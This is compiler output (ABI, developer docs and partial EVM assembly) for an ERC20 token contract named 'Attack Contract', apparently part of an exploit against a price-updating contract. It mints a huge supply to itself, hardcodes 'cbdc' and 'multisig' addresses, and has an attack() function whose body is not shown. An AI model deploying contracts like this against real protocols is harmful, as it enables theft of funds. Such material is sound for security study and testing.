{
	"contracts/PriceUpdater.sol": {
		"MyERC20": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "account",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "subtractedValue",
							"type": "uint256"
						}
					],
					"name": "decreaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "addedValue",
							"type": "uint256"
						}
					],
					"name": "increaseAllowance",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {
					"allowance(address,address)": {
						"details": "See {IERC20-allowance}."
					},
					"approve(address,uint256)": {
						"details": "See {IERC20-approve}. NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address."
					},
					"balanceOf(address)": {
						"details": "See {IERC20-balanceOf}."
					},
					"decimals()": {
						"details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless this function is overridden; NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
					},
					"decreaseAllowance(address,uint256)": {
						"details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
					},
					"increaseAllowance(address,uint256)": {
						"details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
					},
					"name()": {
						"details": "Returns the name of the token."
					},
					"symbol()": {
						"details": "Returns the symbol of the token, usually a shorter version of the name."
					},
					"totalSupply()": {
						"details": "See {IERC20-totalSupply}."
					},
					"transfer(address,uint256)": {
						"details": "See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `amount`."
					},
					"transferFrom(address,address,uint256)": {
						"details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `amount`. - the caller must have allowance for ``from``'s tokens of at least `amount`."
					}
				},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/PriceUpdater.sol\":501:1109  contract MyERC20 is ERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/PriceUpdater.sol\":533:590  address cbdc = 0x094251c982cb00B1b1E1707D61553E304289D4D8 */\n  0x05\n  dup1\n  sload\n  not(sub(exp(0x02, 0xa0), 0x01))\n  swap1\n  dup2\n  and\n    /* \"contracts/PriceUpdater.sol\":548:590  0x094251c982cb00B1b1E1707D61553E304289D4D8 */\n  0x094251c982cb00b1b1e1707d61553e304289d4d8\n    /* \"contracts/PriceUpdater.sol\":533:590  address cbdc = 0x094251c982cb00B1b1E1707D61553E304289D4D8 */\n  or\n  swap1\n  swap2\n  sstore\n    /* \"contracts/PriceUpdater.sol\":596:657  address multisig = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x06\n  dup1\n  sload\n  swap1\n  swap2\n  and\n    /* \"contracts/PriceUpdater.sol\":615:657  0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x550714e1fd747084fc5cb2b2e3a93512972aebda\n    /* \"contracts/PriceUpdater.sol\":596:657  address multisig = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  or\n  swap1\n  sstore\n    /* \"contracts/PriceUpdater.sol\":663:769  constructor() ERC20(\"Attack Contract\", \"AC\") {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1978:2091  constructor(string memory name_, string memory symbol_) {... */\n  0x40\n  dup1\n  mload\n  dup1\n  dup3\n  add\n  dup3\n  mstore\n  0x0f\n  dup2\n  mstore\n  0x41747461636b20436f6e74726163740000000000000000000000000000000000\n  0x20\n  dup1\n  dup4\n  add\n  swap2\n  dup3\n  mstore\n  dup4\n  mload\n  dup1\n  dup6\n  add\n  swap1\n  swap5\n  mstore\n  0x02\n  dup5\n  mstore\n  0x4143000000000000000000000000000000000000000000000000000000000000\n  swap1\n  dup5\n  add\n  mstore\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2044:2057  _name = name_ */\n  dup2\n  mload\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1978:2091  constructor(string memory name_, string memory symbol_) {... */\n  swap2\n  swap3\n  swap2\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2044:2057  _name = name_ */\n  tag_5\n  swap2\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2044:2049  _name */\n  0x03\n  swap2\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2044:2057  _name = name_ */\n  tag_6\n  jump\t// in\ntag_5:\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2067:2084  _symbol = symbol_ */\n  dup1\n  mload\n  tag_7\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2067:2074  _symbol */\n  0x04\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2067:2084  _symbol = symbol_ */\n  0x20\n  dup5\n  add\n  swap1\n  tag_6\n  jump\t// in\ntag_7:\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1978:2091  constructor(string memory name_, string memory symbol_) {... */\n  pop\n  pop\n    /* \"contracts/PriceUpdater.sol\":716:762  _mint(address(this), 100000000000000000 ether) */\n  tag_9\n    /* \"contracts/PriceUpdater.sol\":730:734  this */\n  address\n    /* \"contracts/PriceUpdater.sol\":737:761  100000000000000000 ether */\n  0x13426172c74d822b878fe800000000\n    /* \"contracts/PriceUpdater.sol\":716:721  _mint */\n  mul(0x0100000000, tag_10)\n    /* \"contracts/PriceUpdater.sol\":716:762  _mint(address(this), 100000000000000000 ether) */\n  0x0100000000\n  swap1\n  div\n  jump\t// in\ntag_9:\n    /* \"contracts/PriceUpdater.sol\":501:1109  contract MyERC20 is ERC20 {... */\n  jump(tag_38)\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8402:8791  function _mint(address account, uint256 amount) internal virtual {... */\ntag_10:\n  sub(exp(0x02, 0xa0), 0x01)\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8485:8506  account != address(0) */\n  dup3\n  and\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8477:8542  require(account != address(0), \"ERC20: mint to the zero address\") */\n  tag_13\n  jumpi\n  mload(0x40)\n  0x08c379a000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n    /* \"#utility.yul\":216:218   */\n  0x20\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8477:8542  require(account != address(0), \"ERC20: mint to the zero address\") */\n  0x04\n  dup3\n  add\n    /* \"#utility.yul\":198:219   */\n  mstore\n    /* \"#utility.yul\":255:257   */\n  0x1f\n    /* \"#utility.yul\":235:253   */\n  0x24\n  dup3\n  add\n    /* \"#utility.yul\":228:258   */\n  mstore\n    /* \"#utility.yul\":294:327   */\n  0x45524332303a206d696e7420746f20746865207a65726f206164647265737300\n    /* \"#utility.yul\":274:292   */\n  0x44\n  dup3\n  add\n    /* \"#utility.yul\":267:328   */\n  mstore\n    /* \"#utility.yul\":345:363   */\n  0x64\n  add\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8477:8542  require(account != address(0), \"ERC20: mint to the zero address\") */\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  revert\ntag_13:\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8553:8602  _beforeTokenTransfer(address(0), account, amount) */\n  tag_16\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8582:8583  0 */\n  0x00\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8586:8593  account */\n  dup4\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8595:8601  amount */\n  dup4\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8553:8573  _beforeTokenTransfer */\n  0x0100000000\n  tag_17\n  dup2\n  mul\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8553:8602  _beforeTokenTransfer(address(0), account, amount) */\n  div\n  jump\t// in\ntag_16:\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8629:8635  amount */\n  dup1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8613:8625  _totalSupply */\n  0x02\n  0x00\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8613:8635  _totalSupply += amount */\n  dup3\n  dup3\n  sload\n  tag_18\n  swap2\n  swap1\n  tag_19\n  jump\t// in\ntag_18:\n  swap1\n  swap2\n  sstore\n  pop\n  pop\n  sub(exp(0x02, 0xa0), 0x01)\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8663  _balances[account] */\n  dup3\n  and\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8654  _balances */\n  0x00\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8663  _balances[account] */\n  swap1\n  dup2\n  mstore\n  0x20\n  dup2\n  swap1\n  mstore\n  0x40\n  dup2\n  keccak256\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8673  _balances[account] += amount */\n  dup1\n  sload\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8667:8673  amount */\n  dup4\n  swap3\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8654  _balances */\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8673  _balances[account] += amount */\n  tag_20\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8667:8673  amount */\n  dup5\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8645:8673  _balances[account] += amount */\n  tag_19\n  jump\t// in\ntag_20:\n  swap1\n  swap2\n  sstore\n  pop\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8688:8725  Transfer(address(0), account, amount) */\n  mload(0x40)\n    /* \"#utility.yul\":520:545   */\n  dup2\n  dup2\n  mstore\n  sub(exp(0x02, 0xa0), 0x01)\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8688:8725  Transfer(address(0), account, amount) */\n  dup4\n  and\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8705:8706  0 */\n  0x00\n  swap1\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8688:8725  Transfer(address(0), account, amount) */\n  0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n  swap1\n    /* \"#utility.yul\":508:510   */\n  0x20\n    /* \"#utility.yul\":493:511   */\n  add\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8688:8725  Transfer(address(0), account, amount) */\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8736:8784  _afterTokenTransfer(address(0), account, amount) */\n  tag_23\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8764:8765  0 */\n  0x00\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8768:8775  account */\n  dup4\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8777:8783  amount */\n  dup4\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8736:8755  _afterTokenTransfer */\n  0x0100000000\n  tag_17\n  dup2\n  mul\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8736:8784  _afterTokenTransfer(address(0), account, amount) */\n  div\n  jump\t// in\ntag_23:\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8402:8791  function _mint(address account, uint256 amount) internal virtual {... */\n  pop\n  pop\n  jump\t// out\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11786:11907  function _beforeTokenTransfer(... */\ntag_17:\n  pop\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/PriceUpdater.sol\":501:1109  contract MyERC20 is ERC20 {... */\ntag_6:\n  dup3\n  dup1\n  sload\n  tag_27\n  swap1\n  tag_28\n  jump\t// in\ntag_27:\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  tag_30\n  jumpi\n  0x00\n  dup6\n  sstore\n  jump(tag_33)\ntag_30:\n  dup3\n  0x1f\n  lt\n  tag_31\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_33)\ntag_31:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_33\n  jumpi\n  swap2\n  dup3\n  add\ntag_32:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_33\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_32)\ntag_33:\n  pop\n  tag_34\n  swap3\n  swap2\n  pop\n  tag_35\n  jump\t// in\ntag_34:\n  pop\n  swap1\n  jump\t// out\ntag_35:\ntag_36:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_34\n  jumpi\n  0x00\n  dup2\n  sstore\n  0x01\n  add\n  jump(tag_36)\n    /* \"#utility.yul\":556:838   */\ntag_19:\n    /* \"#utility.yul\":596:599   */\n  0x00\n    /* \"#utility.yul\":627:628   */\n  dup3\n    /* \"#utility.yul\":623:629   */\n  not\n    /* \"#utility.yul\":620:621   */\n  dup3\n    /* \"#utility.yul\":617:630   */\n  gt\n    /* \"#utility.yul\":614:807   */\n  iszero\n  tag_42\n  jumpi\n    /* \"#utility.yul\":663:740   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":660:661   */\n  0x00\n    /* \"#utility.yul\":653:741   */\n  mstore\n    /* \"#utility.yul\":764:768   */\n  0x11\n    /* \"#utility.yul\":761:762   */\n  0x04\n    /* \"#utility.yul\":754:769   */\n  mstore\n    /* \"#utility.yul\":792:796   */\n  0x24\n    /* \"#utility.yul\":789:790   */\n  0x00\n    /* \"#utility.yul\":782:797   */\n  revert\n    /* \"#utility.yul\":614:807   */\ntag_42:\n  pop\n    /* \"#utility.yul\":823:832   */\n  add\n  swap1\n    /* \"#utility.yul\":556:838   */\n  jump\t// out\n    /* \"#utility.yul\":843:1280   */\ntag_28:\n    /* \"#utility.yul\":928:929   */\n  0x02\n    /* \"#utility.yul\":918:930   */\n  dup2\n  div\n    /* \"#utility.yul\":975:976   */\n  0x01\n    /* \"#utility.yul\":965:977   */\n  dup3\n  and\n  dup1\n    /* \"#utility.yul\":986:1047   */\n  tag_44\n  jumpi\n    /* \"#utility.yul\":1040:1044   */\n  0x7f\n    /* \"#utility.yul\":1032:1038   */\n  dup3\n    /* \"#utility.yul\":1028:1045   */\n  and\n    /* \"#utility.yul\":1018:1045   */\n  swap2\n  pop\n    /* \"#utility.yul\":986:1047   */\ntag_44:\n    /* \"#utility.yul\":1093:1095   */\n  0x20\n    /* \"#utility.yul\":1085:1091   */\n  dup3\n    /* \"#utility.yul\":1082:1096   */\n  lt\n    /* \"#utility.yul\":1062:1080   */\n  dup2\n    /* \"#utility.yul\":1059:1097   */\n  eq\n    /* \"#utility.yul\":1056:1274   */\n  iszero\n  tag_45\n  jumpi\n    /* \"#utility.yul\":1130:1207   */\n  0x4e487b7100000000000000000000000000000000000000000000000000000000\n    /* \"#utility.yul\":1127:1128   */\n  0x00\n    /* \"#utility.yul\":1120:1208   */\n  mstore\n    /* \"#utility.yul\":1231:1235   */\n  0x22\n    /* \"#utility.yul\":1228:1229   */\n  0x04\n    /* \"#utility.yul\":1221:1236   */\n  mstore\n    /* \"#utility.yul\":1259:1263   */\n  0x24\n    /* \"#utility.yul\":1256:1257   */\n  0x00\n    /* \"#utility.yul\":1249:1264   */\n  revert\n    /* \"#utility.yul\":1056:1274   */\ntag_45:\n  pop\n    /* \"#utility.yul\":843:1280   */\n  swap2\n  swap1\n  pop\n  jump\t// out\ntag_38:\n    /* \"contracts/PriceUpdater.sol\":501:1109  contract MyERC20 is ERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/PriceUpdater.sol\":501:1109  contract MyERC20 is ERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      calldataload(0x00)\n      0x0100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      dup1\n      0x70a08231\n      gt\n      tag_15\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_11\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_12\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_8\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2156:2254  function name() public view virtual override returns (string memory) {... */\n    tag_3:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4433:4630  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_4:\n      tag_20\n      tag_21\n      calldatasize\n      0x04\n      tag_22\n      jump\t// in\n    tag_21:\n      tag_23\n      jump\t// in\n    tag_20:\n      mload(0x40)\n        /* \"#utility.yul\":2251:2265   */\n      swap1\n      iszero\n        /* \"#utility.yul\":2244:2266   */\n      iszero\n        /* \"#utility.yul\":2226:2267   */\n      dup2\n      mstore\n        /* \"#utility.yul\":2214:2216   */\n      0x20\n        /* \"#utility.yul\":2199:2217   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4433:4630  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n      tag_18\n        /* \"#utility.yul\":2086:2273   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3244:3350  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_5:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3331:3343  _totalSupply */\n      sload(0x02)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3244:3350  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_26:\n      mload(0x40)\n        /* \"#utility.yul\":6147:6172   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":6135:6137   */\n      0x20\n        /* \"#utility.yul\":6120:6138   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3244:3350  function totalSupply() public view virtual override returns (uint256) {... */\n      tag_18\n        /* \"#utility.yul\":6001:6178   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5192:5478  function transferFrom(... */\n    tag_6:\n      tag_20\n      tag_31\n      calldatasize\n      0x04\n      tag_32\n      jump\t// in\n    tag_31:\n      tag_33\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3093:3184  function decimals() public view virtual override returns (uint8) {... */\n    tag_7:\n      mload(0x40)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3175:3177  18 */\n      0x12\n        /* \"#utility.yul\":6325:6361   */\n      dup2\n      mstore\n        /* \"#utility.yul\":6313:6315   */\n      0x20\n        /* \"#utility.yul\":6298:6316   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3093:3184  function decimals() public view virtual override returns (uint8) {... */\n      tag_18\n        /* \"#utility.yul\":6183:6367   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5873:6107  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_8:\n      tag_20\n      tag_40\n      calldatasize\n      0x04\n      tag_22\n      jump\t// in\n    tag_40:\n      tag_41\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3408:3533  function balanceOf(address account) public view virtual override returns (uint256) {... */\n    tag_9:\n      tag_26\n      tag_44\n      calldatasize\n      0x04\n      tag_45\n      jump\t// in\n    tag_44:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3508:3526  _balances[account] */\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3482:3489  uint256 */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3508:3526  _balances[account] */\n      swap1\n      dup2\n      mstore\n      0x20\n      dup2\n      swap1\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3408:3533  function balanceOf(address account) public view virtual override returns (uint256) {... */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2367:2469  function symbol() public view virtual override returns (string memory) {... */\n    tag_10:\n      tag_16\n      tag_49\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":775:1107  function attack() public {... */\n    tag_11:\n      tag_51\n      tag_52\n      jump\t// in\n    tag_51:\n      stop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6594:7021  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_12:\n      tag_20\n      tag_54\n      calldatasize\n      0x04\n      tag_22\n      jump\t// in\n    tag_54:\n      tag_55\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3729:3918  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_13:\n      tag_20\n      tag_58\n      calldatasize\n      0x04\n      tag_22\n      jump\t// in\n    tag_58:\n      tag_59\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3976:4125  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_14:\n      tag_26\n      tag_62\n      calldatasize\n      0x04\n      tag_63\n      jump\t// in\n    tag_62:\n      tag_64\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2156:2254  function name() public view virtual override returns (string memory) {... */\n    tag_17:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2210:2223  string memory */\n      0x60\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2242:2247  _name */\n      0x03\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2235:2247  return _name */\n      dup1\n      sload\n      tag_67\n      swap1\n      tag_68\n      jump\t// in\n    tag_67:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_69\n      swap1\n      tag_68\n      jump\t// in\n    tag_69:\n      dup1\n      iszero\n      tag_70\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_71\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_70)\n    tag_71:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_72:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_72\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_70:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2156:2254  function name() public view virtual override returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4433:4630  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_23:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4516:4520  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4570:4602  _approve(owner, spender, amount) */\n      tag_76\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup2\n        /* 